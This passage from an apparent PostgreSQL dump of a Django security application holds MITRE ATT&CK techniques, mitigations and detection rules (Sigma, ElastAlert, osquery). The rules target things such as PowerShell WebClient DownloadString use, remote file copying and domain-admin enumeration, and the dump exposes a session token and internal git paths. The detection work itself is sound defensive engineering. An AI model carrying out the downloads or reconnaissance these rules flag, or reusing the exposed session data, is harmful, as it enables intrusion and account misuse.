: \\"rundll32.exe\\" and \\n /* common FPs can be added here */\\n not process.parent.args : \\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\SHELL32.dll,RunAsNewUser_RunDLL\\"\\n", "process where event.code: \\"7\\" and file.name : (\\"System.Management.Automation.ni.dll\\", \\"System.Management.Automation.dll\\")and\\n/* add false positives relevant to your environment here */\\nnot process.executable : (\\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\RemoteFXvGPUDisablement.exe\\", \\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\sdiagnhost.exe\\") and\\n not process.name :\\n (\\n \\"Altaro.SubAgent.exe\\",\\n \\"AppV_Manage.exe\\",\\n \\"azureadconnect.exe\\",\\n \\"CcmExec.exe\\",\\n \\"configsyncrun.exe\\",\\n \\"choco.exe\\",\\n \\"ctxappvservice.exe\\",\\n \\"DVLS.Console.exe\\",\\n \\"edgetransport.exe\\",\\n \\"exsetup.exe\\",\\n \\"forefrontactivedirectoryconnector.exe\\",\\n \\"InstallUtil.exe\\",\\n \\"JenkinsOnDesktop.exe\\",\\n \\"Microsoft.EnterpriseManagement.ServiceManager.UI.Console.exe\\",\\n \\"mmc.exe\\",\\n \\"mscorsvw.exe\\",\\n \\"msexchangedelivery.exe\\",\\n \\"msexchangefrontendtransport.exe\\",\\n \\"msexchangehmworker.exe\\",\\n \\"msexchangesubmission.exe\\",\\n \\"msiexec.exe\\",\\n \\"MsiExec.exe\\",\\n \\"noderunner.exe\\",\\n \\"NServiceBus.Host.exe\\",\\n \\"NServiceBus.Host32.exe\\",\\n \\"NServiceBus.Hosting.Azure.HostProcess.exe\\",\\n \\"OuiGui.WPF.exe\\",\\n \\"powershell.exe\\",\\n \\"powershell_ise.exe\\",\\n \\"pwsh.exe\\",\\n \\"SCCMCliCtrWPF.exe\\",\\n \\"ScriptEditor.exe\\",\\n \\"ScriptRunner.exe\\",\\n \\"sdiagnhost.exe\\",\\n \\"servermanager.exe\\",\\n \\"setup100.exe\\",\\n \\"ServiceHub.VSDetouredHost.exe\\",\\n \\"SPCAF.Client.exe\\",\\n \\"SPCAF.SettingsEditor.exe\\",\\n \\"SQLPS.exe\\",\\n \\"telemetryservice.exe\\",\\n \\"UMWorkerProcess.exe\\",\\n \\"w3wp.exe\\",\\n \\"wsmprovhost.exe\\"\\n )"]}}}}}	2021-08-19 13:42:46.336855+00
463	yes	other	P1	#008000	Process monitoring,Process commandline parameters	{"accuracy_score": 90}	T1087.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"sigma": [], "osquery": ["select usr.username, sht.command, sht.history_file from shell_history sht JOIN users usr ON sht.uid = usr.uid WHERE sht.uid IN (SELECT uid from users);", "select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';"], "elasticsiem": []}, "network": {"zeek": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_config_options.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_consts.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_detect.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_report.zeek"], "sigma": [{"rule": "reconnaissance_activity_0", "elastalert": {"name": "reconnaissance_activity_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(winlog.channel:\\"Security\\" AND event.code:\\"4616\\" OR winlog.event_data.AccessMask.security:\\"0x2d\\" OR ((winlog.event_data.ObjectType.security:\\"SAM_USER\\" AND winlog.event_data.ObjectName.security:\\"S\\\\-1\\\\-5\\\\-21\\\\-*\\\\-500\\") OR (winlog.event_data.ObjectType.security:\\"SAM_GROUP\\" AND winlog.event_data.ObjectName.security:\\"S\\\\-1\\\\-5\\\\-21\\\\-*\\\\-512\\")))"}}], "realert": {"minutes": 2}, "priority": 3, "description": "Detects activity as \\"net user administrator /domain\\" and \\"net group domain admins /domain\\""}}], "osquery": [], "elasticsiem": []}, "windows": {"sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%net.exe%';"], "elasticsiem": []}}}}}	2021-08-30 13:37:49.382697+00
71	yes	yaml,OSQuery	Partial detection and attack technique as the yaml file availableprovides incomplete information	#FFA500	File monitoring,Process monitoring	{"accuracy_score": 40}	T1105	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"other": [], "sigma": [{"rule": "lnx_file_copy.yml", "elastalert": {"name": "remote_file_copy_1", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(agent.type:filebeat AND message:type=SYSCALL* AND (*scp* OR *sftp* OR *rsync))"}}], "realert": {"minutes": 0}, "priority": 4, "description": "Detects the use of tools that copy files from or to remote systems"}}], "osquery": [], "elasticsiem": []}, "network": {"zeek": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master"], "sigma": [{"rule": "git@10.11.93.198:/home/git/ACDS/Detection/Tools/Sigma/elastalert/network/zeek_http_executable_download_from_webdav_elastalert.yml", "elastalert": "name: executable_from_webdav_0 description: Detects executable access via webdav6. Can be seen in APT 29 such as from the emulated APT 29 hackathon https://github.com/OTRF/detection-hackathon-apt29/ index: bhd10944_searchnode:so-* priority: 3 realert: minutes: 0 filter: - query_string: query: ((http.useragent:\\"*WebDAV*\\" OR http.uri:\\"*webdav*\\") AND (file.mime_type:\\"*dosexec*\\" OR http.uri:\\"*.exe\\")) type: any alert: - debug"}], "osquery": [], "elasticsiem": []}, "windows": {"other": [], "sigma": [{"rule": "win_susp_ps_downloadfile.yml", "elastalert": {"name": "powershell_downloadfile_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(agent.type:winlogbeat AND process.command_line:(*powershell.exe* AND *Net.WebClient* AND *DownloadString*))"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects the execution of powershell, a WebClient object creation and the invocation of DownloadFile in a single command line"}}], "osquery": ["select * from file_events;", "select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%certutil%';"], "elasticsiem": []}}}}}	2021-08-27 07:05:28.343135+00
\.


--
-- Data for Name: django_admin_log; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.django_admin_log (id, action_time, object_id, object_repr, action_flag, change_message, content_type_id, user_id) FROM stdin;
1	2021-02-10 13:59:41.027144+00	T1602.001	T1602.001	2	[{"changed": {"fields": ["Color"]}}]	8	1
\.


--
-- Data for Name: django_content_type; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.django_content_type (id, app_label, model) FROM stdin;
1	admin	logentry
2	auth	permission
3	auth	group
4	auth	user
5	contenttypes	contenttype
6	sessions	session
7	technique_details	attacks
8	technique_details	technique
9	technique_details	techniqueattack
10	technique_details	tactic
11	technique_details	detection
12	technique_details	mitigation
\.


--
-- Data for Name: django_migrations; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.django_migrations (id, app, name, applied) FROM stdin;
1	contenttypes	0001_initial	2021-02-10 12:46:36.882931+00
2	auth	0001_initial	2021-02-10 12:46:36.987859+00
3	admin	0001_initial	2021-02-10 12:46:37.617139+00
4	admin	0002_logentry_remove_auto_add	2021-02-10 12:46:37.650051+00
5	admin	0003_logentry_add_action_flag_choices	2021-02-10 12:46:37.655041+00
6	contenttypes	0002_remove_content_type_name	2021-02-10 12:46:37.669004+00
7	auth	0002_alter_permission_name_max_length	2021-02-10 12:46:37.675987+00
8	auth	0003_alter_user_email_max_length	2021-02-10 12:46:37.680972+00
9	auth	0004_alter_user_username_opts	2021-02-10 12:46:37.685959+00
10	auth	0005_alter_user_last_login_null	2021-02-10 12:46:37.691943+00
11	auth	0006_require_contenttypes_0002	2021-02-10 12:46:37.692939+00
12	auth	0007_alter_validators_add_error_messages	2021-02-10 12:46:37.696929+00
13	auth	0008_alter_user_username_max_length	2021-02-10 12:46:37.72398+00
14	auth	0009_alter_user_last_name_max_length	2021-02-10 12:46:37.728969+00
15	auth	0010_alter_group_name_max_length	2021-02-10 12:46:37.735958+00
16	auth	0011_update_proxy_permissions	2021-02-10 12:46:37.742929+00
17	auth	0012_alter_user_first_name_max_length	2021-02-10 12:46:37.747916+00
18	sessions	0001_initial	2021-02-10 12:46:37.769856+00
\.


--
-- Data for Name: django_session; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.django_session (session_key, session_data, expire_date) FROM stdin;
c1fu02rwjjb7qxj0eg0d713xsznm1zvy	.eJxVjEEOwiAQRe_C2hBApgwu3fcMBIapVA1NSrsy3l1JutDtf-_9lwhx30rYG69hzuIitDj9binSg2sH-R7rbZG01G2dk-yKPGiT45L5eT3cv4MSW_nWHg1bPyWlHCM5YgdmAKXPYH1CsDlOniAno9GjQlSQmRSw6-4AJN4fzSs3kg:1l9q7Y:FrL1WKFOXxT_fd5QdbrdURFeOUAWMUrZG1iSfPiL-eE	2021-02-24 14:05:32.110408+00
\.


--
-- Data for Name: mitigation; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.mitigation (mitigate_id, mitigate_name, description, support, brief_info, color) FROM stdin;
M1036	Account Use Policies	Configure features related to account use like login attempt lockouts, specific login times, etc.	\N	\N	\N
M1015	Active Directory Configuration	Configure Active Directory to prevent use of certain techniques; use SID Filtering, etc.	\N	\N	\N
M1049	Antivirus/Antimalware	Use signatures or heuristics to detect malicious software.	\N	\N	\N
M1013	Application Developer Guidance	This mitigation describes any guidance or training given to developers of applications to avoid introducing security weaknesses that an adversary may be able to take advantage of.	\N	\N	\N
M1048	Application Isolation and Sandboxing	Restrict execution of code to a virtual environment on or in transit to an endpoint system.	\N	\N	\N
M1047	Audit	Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.	\N	\N	\N
M1040	Behavior Prevention on Endpoint	Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.	\N	\N	\N
M1046	Boot Integrity	Use secure methods to boot a system and verify the integrity of the operating system and loading mechanisms.	\N	\N	\N
M1045	Code Signing	Enforce binary and application integrity with digital signature verification to prevent untrusted code from executing.	\N	\N	\N
M1043	Credential Access Protection	Use capabilities to prevent successful credential access by adversaries; including blocking forms of credential dumping.	\N	\N	\N
M1053	Data Backup	Take and store data backups from end user systems and critical servers. Ensure backup and storage systems are hardened and kept separate from the corporate network to prevent compromise.	\N	\N	\N
M1042	Disable or Remove Feature or Program	Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.	\N	\N	\N
M1038	Execution Prevention	Block execution of code on a system through application control, and/or script blocking.	\N	\N	\N
M1055	Do Not Mitigate	This category is to associate techniques that mitigation might increase risk of compromise and therefore mitigation is not recommended.	\N	\N	\N
M1041	Encrypt Sensitive Information	Protect sensitive information with strong encryption.	\N	\N	\N
M1039	Environment Variable Permissions	Prevent modification of environment variables by unauthorized users and groups.	\N	\N	\N
M1050	Exploit Protection	Use capabilities to detect and block conditions that may lead to or be indicative of a software exploit occurring.	\N	\N	\N
M1037	Filter Network Traffic	Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.	\N	\N	\N
M1035	Limit Access to Resource Over Network	Prevent access to file shares, remote access to systems, unnecessary services. Mechanisms to limit access may include use of network concentrators, RDP gateways, etc.	\N	\N	\N
M1034	Limit Hardware Installation	Block users or groups from installing or using unapproved hardware on systems, including USB devices.	\N	\N	\N
M1033	Limit Software Installation	Block users or groups from installing unapproved software.	\N	\N	\N
M1032	Multi-factor Authentication	Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.	\N	\N	\N
M1031	Network Intrusion Prevention	Use intrusion detection signatures to block traffic at network boundaries.	\N	\N	\N
M1030	Network Segmentation	Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network. Configure separate virtual private cloud (VPC) instances to isolate critical cloud systems.	\N	\N	\N
M1028	Operating System Configuration	Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.	\N	\N	\N
M1027	Password Policies	Set and enforce secure password policies for accounts.	\N	\N	\N
M1056	Pre-compromise	This category is used for any applicable mitigation activities that apply to techniques occurring before an adversary gains Initial Access, such as Reconnaissance and Resource Development techniques.	\N	\N	\N
M1026	Privileged Account Management	Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.	\N	\N	\N
M1025	Privileged Process Integrity	Protect processes with high privileges that can be used to interact with critical system components through use of protected process light, anti-process injection defenses, or other process integrity enforcement measures.	\N	\N	\N
M1029	Remote Data Storage	Use remote security log and sensitive file storage where access can be controlled better to prevent exposure of intrusion detection log data or sensitive information.	\N	\N	\N
M1022	Restrict File and Directory Permissions	Restrict access by setting directory and file permissions that are not specific to users or privileged accounts.	\N	\N	\N
M1044	Restrict Library Loading	Prevent abuse of library loading mechanisms in the operating system and software to load untrusted code by configuring appropriate library loading mechanisms and investigating potential vulnerable software.	\N	\N	\N
M1024	Restrict Registry Permissions	Restrict the ability to modify certain hives or keys in the Windows Registry.	\N	\N	\N
M1021	Restrict Web-Based Content	Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.	\N	\N	\N
M1020	SSL/TLS Inspection	Break and inspect SSL/TLS sessions to look at encrypted web traffic for adversary activity.	\N	\N	\N
M1054	Software Configuration	Implement configuration changes to software (other than the operating system) to mitigate security risks associated to how the software operates.	\N	\N	\N
M1019	Threat Intelligence Program	A threat intelligence program helps an organization generate their own threat intelligence information and track trends to inform defensive priorities to mitigate risk.	\N	\N	\N
M1051	Update Software	Perform regular software updates to mitigate exploitation risk.	\N	\N	\N
M1052	User Account Control	Configure Windows User Account Control to mitigate risk of adversaries obtaining elevated process access.	\N	\N	\N
M1018	User Account Management	Manage the creation, modification, use, and permissions associated to user accounts.	\N	\N	\N
M1017	User Training	Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.	\N	\N	\N
M1016	Vulnerability Scanning	Vulnerability scanning is used to find potentially exploitable software vulnerabilities to remediate them.	\N	\N	\N
\.


--
-- Data for Name: old_techniques; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.old_techniques (technique_id, technique_name, sub_technique_id, sub_technique_name, tactic_id, color, support) FROM stdin;
T1548	Abuse Elevation Control Mechanism	T1548.001	Setuid and Setgid	TA0005	\N	\N
T1548	Abuse Elevation Control Mechanism	T1548.002	Bypass User Account Control	TA0005	\N	\N
T1548	Abuse Elevation Control Mechanism	T1548.003	Sudo and Sudo Caching	TA0005	\N	\N
T1548	Abuse Elevation Control Mechanism	T1548.004	Elevated Execution with Prompt	TA0005	\N	\N
T1134	Access Token Manipulation	T1134.001	Token Impersonation/Theft	TA0005	\N	\N
T1134	Access Token Manipulation	T1134.002	Create Process with Token	TA0005	\N	\N
T1134	Access Token Manipulation	T1134.003	Make and Impersonate Token	TA0005	\N	\N
T1134	Access Token Manipulation	T1134.004	Parent PID Spoofing	TA0005	\N	\N
T1134	Access Token Manipulation	T1134.005	SID-History Injection	TA0005	\N	\N
T1531	Account Access Removal	T1531	\N	TA0040	\N	\N
T1087	Account Discovery	T1087.001	Local Account	TA0007	\N	\N
T1087	Account Discovery	T1087.002	Domain Account	TA0007	\N	\N
T1087	Account Discovery	T1087.003	Email Account	TA0007	\N	\N
T1087	Account Discovery	T1087.004	Cloud Account	TA0007	\N	\N
T1098	Account Manipulation	T1098.001	Additional Cloud Credentials	TA0003	\N	\N
T1098	Account Manipulation	T1098.002	Exchange Email Delegate Permissions	TA0003	\N	\N
T1098	Account Manipulation	T1098.003	Add Office 365 Global Administrator Role	TA0003	\N	\N
T1098	Account Manipulation	T1098.004	SSH Authorized Keys	TA0003	\N	\N
T1583	Acquire Infrastructure	T1583.001	Domains	TA0042	\N	\N
T1583	Acquire Infrastructure	T1583.002	DNS Server	TA0042	\N	\N
T1583	Acquire Infrastructure	T1583.003	Virtual Private Server	TA0042	\N	\N
T1583	Acquire Infrastructure	T1583.004	Server	TA0042	\N	\N
T1583	Acquire Infrastructure	T1583.005	Botnet	TA0042	\N	\N
T1583	Acquire Infrastructure	T1583.006	Web Services	TA0042	\N	\N
T1595	Active Scanning	T1595.001	Scanning IP Blocks	TA0043	\N	\N
T1595	Active Scanning	T1595.002	Vulnerability Scanning	TA0043	\N	\N
T1071	Application Layer Protocol	T1071.001	Web Protocols	TA0011	\N	\N
T1071	Application Layer Protocol	T1071.002	File Transfer Protocols	TA0011	\N	\N
T1071	Application Layer Protocol	T1071.003	Mail Protocols	TA0011	\N	\N
T1071	Application Layer Protocol	T1071.004	DNS	TA0011	\N	\N
T1010	Application Window Discovery	T1010	\N	TA0007	\N	\N
T1560	Archive Collected Data	T1560.001	Archive via Utility	TA0009	\N	\N
T1560	Archive Collected Data	T1560.002	Archive via Library	TA0009	\N	\N
T1560	Archive Collected Data	T1560.003	Archive via Custom Method	TA0009	\N	\N
T1123	Audio Capture	T1123	\N	TA0009	\N	\N
T1119	Automated Collection	T1119	\N	TA0009	\N	\N
T1020	Automated Exfiltration	T1020.001	Traffic Duplication	TA0010	\N	\N
T1197	BITS Jobs	T1197	\N	TA0005	\N	\N
T1547	Boot or Logon Autostart Execution	T1547.001	Registry Run Keys / Startup Folder	TA0003	\N	\N
T1547	Boot or Logon Autostart Execution	T1547.002	Authentication Package	TA0003	\N	\N
T1547	Boot or Logon Autostart Execution	T1547.003	Time Providers	TA0003	\N	\N
T1547	Boot or Logon Autostart Execution	T1547.004	Winlogon Helper DLL	TA0003	\N	\N
T1547	Boot or Logon Autostart Execution	T1547.005	Security Support Provider	TA0003	\N	\N
T1547	Boot or Logon Autostart Execution	T1547.006	Kernel Modules and Extensions	TA0003	\N	\N
T1547	Boot or Logon Autostart Execution	T1547.007	Re-opened Applications	TA0003	\N	\N
T1547	Boot or Logon Autostart Execution	T1547.008	LSASS Driver	TA0003	\N	\N
T1547	Boot or Logon Autostart Execution	T1547.009	Shortcut Modification	TA0003	\N	\N
T1547	Boot or Logon Autostart Execution	T1547.010	Port Monitors	TA0003	\N	\N
T1547	Boot or Logon Autostart Execution	T1547.011	Plist Modification	TA0003	\N	\N
T1547	Boot or Logon Autostart Execution	T1547.012	Print Processors	TA0003	\N	\N
T1037	Boot or Logon Initialization Scripts	T1037.001	Logon Script (Windows)	TA0003	\N	\N
T1037	Boot or Logon Initialization Scripts	T1037.002	Logon Script (Mac)	TA0003	\N	\N
T1037	Boot or Logon Initialization Scripts	T1037.003	Network Logon Script	TA0003	\N	\N
T1037	Boot or Logon Initialization Scripts	T1037.004	Rc.common	TA0003	\N	\N
T1037	Boot or Logon Initialization Scripts	T1037.005	Startup Items	TA0003	\N	\N
T1217	Browser Bookmark Discovery	T1217	\N	TA0007	\N	\N
T1176	Browser Extensions	T1176	\N	TA0003	\N	\N
T1110	Brute Force	T1110.001	Password Guessing	TA0006	\N	\N
T1110	Brute Force	T1110.002	Password Cracking	TA0006	\N	\N
T1110	Brute Force	T1110.003	Password Spraying	TA0006	\N	\N
T1110	Brute Force	T1110.004	Credential Stuffing	TA0006	\N	\N
T1115	Clipboard Data	T1115	\N	TA0009	\N	\N
T1580	Cloud Infrastructure Discovery	T1580	\N	TA0007	\N	\N
T1538	Cloud Service Dashboard	T1538	\N	TA0007	\N	\N
T1526	Cloud Service Discovery	T1526	\N	TA0007	\N	\N
T1059	Command and Scripting Interpreter	T1059.001	PowerShell	TA0002	\N	\N
T1059	Command and Scripting Interpreter	T1059.002	AppleScript	TA0002	\N	\N
T1059	Command and Scripting Interpreter	T1059.003	Windows Command Shell	TA0002	\N	\N
T1059	Command and Scripting Interpreter	T1059.004	Unix Shell	TA0002	\N	\N
T1059	Command and Scripting Interpreter	T1059.005	Visual Basic	TA0002	\N	\N
T1059	Command and Scripting Interpreter	T1059.006	Python	TA0002	\N	\N
T1059	Command and Scripting Interpreter	T1059.007	JavaScript/JScript	TA0002	\N	\N
T1059	Command and Scripting Interpreter	T1059.008	Network Device CLI	TA0002	\N	\N
T1043	Commonly Used Port	T1043	\N	TA0011	\N	\N
T1092	Communication Through Removable Media	T1092	\N	TA0011	\N	\N
T1175	Component Object Model and Distributed COM	T1175	\N	TA0002	\N	\N
T1586	Compromise Accounts	T1586.001	Social Media Accounts	TA0042	\N	\N
T1586	Compromise Accounts	T1586.002	Email Accounts	TA0042	\N	\N
T1554	Compromise Client Software Binary	T1554	\N	TA0003	\N	\N
T1584	Compromise Infrastructure	T1584.001	Domains	TA0042	\N	\N
T1584	Compromise Infrastructure	T1584.002	DNS Server	TA0042	\N	\N
T1584	Compromise Infrastructure	T1584.003	Virtual Private Server	TA0042	\N	\N
T1584	Compromise Infrastructure	T1584.004	Server	TA0042	\N	\N
T1584	Compromise Infrastructure	T1584.005	Botnet	TA0042	\N	\N
T1584	Compromise Infrastructure	T1584.006	Web Services	TA0042	\N	\N
T1136	Create Account	T1136.001	Local Account	TA0003	\N	\N
T1136	Create Account	T1136.002	Domain Account	TA0003	\N	\N
T1136	Create Account	T1136.003	Cloud Account	TA0003	\N	\N
T1543	Create or Modify System Process	T1543.001	Launch Agent	TA0003	\N	\N
T1543	Create or Modify System Process	T1543.002	Systemd Service	TA0003	\N	\N
T1543	Create or Modify System Process	T1543.003	Windows Service	TA0003	\N	\N
T1543	Create or Modify System Process	T1543.004	Launch Daemon	TA0003	\N	\N
T1555	Credentials from Password Stores	T1555.001	Keychain	TA0006	\N	\N
T1555	Credentials from Password Stores	T1555.002	Securityd Memory	TA0006	\N	\N
T1555	Credentials from Password Stores	T1555.003	Credentials from Web Browsers	TA0006	\N	\N
T1485	Data Destruction	T1485	\N	TA0040	\N	\N
T1132	Data Encoding	T1132.001	Standard Encoding	TA0011	\N	\N
T1132	Data Encoding	T1132.002	Non-Standard Encoding	TA0011	\N	\N
T1486	Data Encrypted for Impact	T1486	\N	TA0040	\N	\N
T1565	Data Manipulation	T1565.001	Stored Data Manipulation	TA0040	\N	\N
T1565	Data Manipulation	T1565.002	Transmitted Data Manipulation	TA0040	\N	\N
T1565	Data Manipulation	T1565.003	Runtime Data Manipulation	TA0040	\N	\N
T1001	Data Obfuscation	T1001.001	Junk Data	TA0011	\N	\N
T1001	Data Obfuscation	T1001.002	Steganography	TA0011	\N	\N
T1001	Data Obfuscation	T1001.003	Protocol Impersonation	TA0011	\N	\N
T1074	Data Staged	T1074.001	Local Data Staging	TA0009	\N	\N
T1074	Data Staged	T1074.002	Remote Data Staging	TA0009	\N	\N
T1030	Data Transfer Size Limits	T1030	\N	TA0010	\N	\N
T1530	Data from Cloud Storage Object	T1530	\N	TA0009	\N	\N
T1602	Data from Configuration Repository	T1602.001	SNMP (MIB Dump)	TA0009	\N	\N
T1602	Data from Configuration Repository	T1602.002	Network Device Configuration Dump	TA0009	\N	\N
T1213	Data from Information Repositories	T1213.001	Confluence	TA0009	\N	\N
T1213	Data from Information Repositories	T1213.002	Sharepoint	TA0009	\N	\N
T1005	Data from Local System	T1005	\N	TA0009	\N	\N
T1039	Data from Network Shared Drive	T1039	\N	TA0009	\N	\N
T1025	Data from Removable Media	T1025	\N	TA0009	\N	\N
T1491	Defacement	T1491.001	Internal Defacement	TA0040	\N	\N
T1491	Defacement	T1491.002	External Defacement	TA0040	\N	\N
T1140	Deobfuscate/Decode Files or Information	T1140	\N	TA0005	\N	\N
T1587	Develop Capabilities	T1587.001	Malware	TA0042	\N	\N
T1587	Develop Capabilities	T1587.002	Code Signing Certificates	TA0042	\N	\N
T1587	Develop Capabilities	T1587.003	Digital Certificates	TA0042	\N	\N
T1587	Develop Capabilities	T1587.004	Exploits	TA0042	\N	\N
T1006	Direct Volume Access	T1006	\N	TA0005	\N	\N
T1561	Disk Wipe	T1561.001	Disk Content Wipe	TA0040	\N	\N
T1561	Disk Wipe	T1561.002	Disk Structure Wipe	TA0040	\N	\N
T1482	Domain Trust Discovery	T1482	\N	TA0007	\N	\N
T1189	Drive-by Compromise	T1189	\N	TA0001	\N	\N
T1568	Dynamic Resolution	T1568.001	Fast Flux DNS	TA0011	\N	\N
T1568	Dynamic Resolution	T1568.002	Domain Generation Algorithms	TA0011	\N	\N
T1568	Dynamic Resolution	T1568.003	DNS Calculation	TA0011	\N	\N
T1114	Email Collection	T1114.001	Local Email Collection	TA0009	\N	\N
T1114	Email Collection	T1114.002	Remote Email Collection	TA0009	\N	\N
T1114	Email Collection	T1114.003	Email Forwarding Rule	TA0009	\N	\N
T1573	Encrypted Channel	T1573.001	Symmetric Cryptography	TA0011	\N	\N
T1573	Encrypted Channel	T1573.002	Asymmetric Cryptography	TA0011	\N	\N
T1499	Endpoint Denial of Service	T1499.001	OS Exhaustion Flood	TA0040	\N	\N
T1499	Endpoint Denial of Service	T1499.002	Service Exhaustion Flood	TA0040	\N	\N
T1499	Endpoint Denial of Service	T1499.003	Application Exhaustion Flood	TA0040	\N	\N
T1499	Endpoint Denial of Service	T1499.004	Application or System Exploitation	TA0040	\N	\N
T1585	Establish Accounts	T1585.001	Social Media Accounts	TA0042	\N	\N
T1585	Establish Accounts	T1585.002	Email Accounts	TA0042	\N	\N
T1546	Event Triggered Execution	T1546.001	Change Default File Association	TA0003	\N	\N
T1546	Event Triggered Execution	T1546.002	Screensaver	TA0003	\N	\N
T1546	Event Triggered Execution	T1546.003	Windows Management Instrumentation Event Subscription	TA0003	\N	\N
T1546	Event Triggered Execution	T1546.004	.bash_profile and .bashrc	TA0003	\N	\N
T1546	Event Triggered Execution	T1546.005	Trap	TA0003	\N	\N
T1546	Event Triggered Execution	T1546.006	LC_LOAD_DYLIB Addition	TA0003	\N	\N
T1546	Event Triggered Execution	T1546.007	Netsh Helper DLL	TA0003	\N	\N
T1546	Event Triggered Execution	T1546.008	Accessibility Features	TA0003	\N	\N
T1546	Event Triggered Execution	T1546.009	AppCert DLLs	TA0003	\N	\N
T1546	Event Triggered Execution	T1546.010	AppInit DLLs	TA0003	\N	\N
T1546	Event Triggered Execution	T1546.011	Application Shimming	TA0003	\N	\N
T1546	Event Triggered Execution	T1546.012	Image File Execution Options Injection	TA0003	\N	\N
T1546	Event Triggered Execution	T1546.013	PowerShell Profile	TA0003	\N	\N
T1546	Event Triggered Execution	T1546.014	Emond	TA0003	\N	\N
T1546	Event Triggered Execution	T1546.015	Component Object Model Hijacking	TA0003	\N	\N
T1480	Execution Guardrails	T1480.001	Environmental Keying	TA0005	\N	\N
T1048	Exfiltration Over Alternative Protocol	T1048.001	Exfiltration Over Symmetric Encrypted Non-C2 Protocol	TA0010	\N	\N
T1048	Exfiltration Over Alternative Protocol	T1048.002	Exfiltration Over Asymmetric Encrypted Non-C2 Protocol	TA0010	\N	\N
T1012	Query Registry	T1012	\N	TA0007	\N	\N
T1048	Exfiltration Over Alternative Protocol	T1048.003	Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol	TA0010	\N	\N
T1041	Exfiltration Over C2 Channel	T1041	\N	TA0010	\N	\N
T1011	Exfiltration Over Other Network Medium	T1011.001	Exfiltration Over Bluetooth	TA0010	\N	\N
T1052	Exfiltration Over Physical Medium	T1052.001	Exfiltration over USB	TA0010	\N	\N
T1567	Exfiltration Over Web Service	T1567.001	Exfiltration to Code Repository	TA0010	\N	\N
T1567	Exfiltration Over Web Service	T1567.002	Exfiltration to Cloud Storage	TA0010	\N	\N
T1190	Exploit Public-Facing Application	T1190	\N	TA0001	\N	\N
T1203	Exploitation for Client Execution	T1203	\N	TA0002	\N	\N
T1212	Exploitation for Credential Access	T1212	\N	TA0006	\N	\N
T1211	Exploitation for Defense Evasion	T1211	\N	TA0005	\N	\N
T1068	Exploitation for Privilege Escalation	T1068	\N	TA0004	\N	\N
T1210	Exploitation of Remote Services	T1210	\N	TA0008	\N	\N
T1133	External Remote Services	T1133	\N	TA0001	\N	\N
T1008	Fallback Channels	T1008	\N	TA0011	\N	\N
T1083	File and Directory Discovery	T1083	\N	TA0007	\N	\N
T1222	File and Directory Permissions Modification	T1222.001	Windows File and Directory Permissions Modification	TA0005	\N	\N
T1222	File and Directory Permissions Modification	T1222.002	Linux and Mac File and Directory Permissions Modification	TA0005	\N	\N
T1495	Firmware Corruption	T1495	\N	TA0040	\N	\N
T1187	Forced Authentication	T1187	\N	TA0006	\N	\N
T1592	Gather Victim Host Information	T1592.001	Hardware	TA0043	\N	\N
T1592	Gather Victim Host Information	T1592.002	Software	TA0043	\N	\N
T1592	Gather Victim Host Information	T1592.003	Firmware	TA0043	\N	\N
T1592	Gather Victim Host Information	T1592.004	Client Configurations	TA0043	\N	\N
T1589	Gather Victim Identity Information	T1589.001	Credentials	TA0043	\N	\N
T1589	Gather Victim Identity Information	T1589.002	Email Addresses	TA0043	\N	\N
T1589	Gather Victim Identity Information	T1589.003	Employee Names	TA0043	\N	\N
T1590	Gather Victim Network Information	T1590.001	Domain Properties	TA0043	\N	\N
T1590	Gather Victim Network Information	T1590.002	DNS	TA0043	\N	\N
T1590	Gather Victim Network Information	T1590.003	Network Trust Dependencies	TA0043	\N	\N
T1590	Gather Victim Network Information	T1590.004	Network Topology	TA0043	\N	\N
T1590	Gather Victim Network Information	T1590.005	IP Addresses	TA0043	\N	\N
T1590	Gather Victim Network Information	T1590.006	Network Security Appliances	TA0043	\N	\N
T1591	Gather Victim Org Information	T1591.001	Determine Physical Locations	TA0043	\N	\N
